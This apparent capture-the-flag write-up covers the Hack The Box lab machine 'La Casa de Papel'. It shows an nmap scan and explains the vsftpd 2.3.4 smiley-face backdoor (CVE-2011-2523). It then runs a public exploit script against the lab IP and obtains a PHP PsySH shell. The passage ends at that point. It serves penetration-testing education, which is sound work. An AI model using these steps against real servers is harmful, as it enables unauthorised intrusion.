---
layout: posts
title: "HTB — La Casa de Papel Writeup"
date: 2026-01-23
tags: [htb, writeup, linux, web]
categories: [ctf]
---

## Overview

- **Machine:** La Casa de Papel
- **Platform:** Hack The Box
- **OS:** Linux
- **Difficulty:** Easy

La Casa de Papel is an easy machine that highlights the importance of keeping software up to date. While the difficulty is low, the machine is longer than usual, as it requires several distinct steps to fully compromise. It also introduces interesting concepts related to SSL certificates and secure connections.

---

## Initial Enumeration

### Nmap Scan

```bash
┌──(kali㉿kali)-[~/hackthebox/lacasadepapel]
└─$ sudo nmap -p- -sVC 10.10.10.131

Nmap scan report for 10.10.10.131
Host is up (0.050s latency).
Not shown: 65458 closed tcp ports (reset), 72 filtered tcp ports (no-response), 1 filtered tcp port (port-unreach)

PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|   256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth:
|   HTTP/1.1 401 Unauthorized
|_  Server returned status 401 but no WWW-Authenticate header.
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30

Service Info: OS: Unix
```
Nmap reveals four open ports. 

Port 21 is running a vsftpd FTP service. Anonymous login is not permitted; however, the service is using an outdated and well-known version of vsftpd, which has historically been associated with serious vulnerabilities.



A quick research will show us [CVE-2011-2523](https://www.cvedetails.com/cve/CVE-2011-2523/). The CVE explains that the executable downloadable from the source contains a malicious beackdoor and a little bit further into research reveals that users logging into a compromised vsftpd-2.3.4 server may issue a :) smileyface as the username and gain a command shell on port 6200.

Due to the age of this CVE, reliable proof-of-concept exploits are easy to find and well documented. I'm going to be using this [one](https://github.com/Hellsender01/vsftpd_2.3.4_Exploit)

```bash
┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/vsftpd_2.3.4_Exploit]
└─$ python exploit.py 10.129.8.191
[+] Got Shell!!!
[+] Opening connection to 10.129.8.191 on port 21: Done
[*] Closed connection to 10.129.8.191 port 21
[+] Opening connection to 10.129.8.191 on port 6200: Done
[*] Switching to interactive mode

Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
$
```
The exploit works, however, we don't get a bash shell. Instead, we have a Psy Shell, which is the interpreter for PHP code, similar to python's interactive shell. This means we have to execute commands using php language.



